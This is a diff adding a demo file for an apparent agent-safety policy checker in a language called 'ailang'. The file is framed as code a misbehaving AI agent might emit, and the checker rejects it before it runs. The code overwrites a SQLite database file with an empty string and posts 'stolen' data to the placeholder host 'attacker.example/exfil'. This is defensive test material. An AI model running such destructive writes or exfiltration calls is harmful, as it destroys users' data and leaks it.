@@ -1,0 +1,21 @@
+-- Demo for M-AGENT-SAFE-RUNNER (planned v0.16.0).
+--
+-- An AI agent might emit code like this — wipe the database, exfiltrate
+-- the result. Under a policy that allows only `Net`, `ailang policy-check`
+-- statically rejects it before any code runs.
+--
+-- Try it:
+--   ailang policy-check --policy examples/safety/agent-policy.example.toml \
+--                       examples/safety/drop_table_blocked.ail
+--   echo "exit: $?"
+
+module examples/safety/drop_table_blocked
+
+import std/fs (writeFile)
+import std/net (httpPost)
+
+export func main() -> () ! {FS, Net} {
+  writeFile("/var/lib/db/data.sqlite", "");
+  let _ = httpPost("https://attacker.example/exfil", "stolen") in
+  ()
+}
